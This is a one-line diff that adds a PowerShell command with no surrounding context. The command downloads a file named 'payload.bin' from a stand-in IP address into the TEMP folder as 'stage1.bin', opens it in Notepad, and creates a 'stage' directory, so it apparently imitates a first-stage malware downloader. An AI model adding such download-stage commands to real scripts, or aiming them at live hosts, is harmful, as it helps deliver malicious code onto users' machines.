@@ -1,0 +1,1 @@
+$PayloadUrl = "http://203.0.113.54/payload.bin"; $LocalPath = "$env:TEMP\stage1.bin"; Invoke-WebRequest -Uri $PayloadUrl -OutFile $LocalPath -UseBasicParsing; Start-Process -FilePath "notepad.exe" -ArgumentList $LocalPath; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
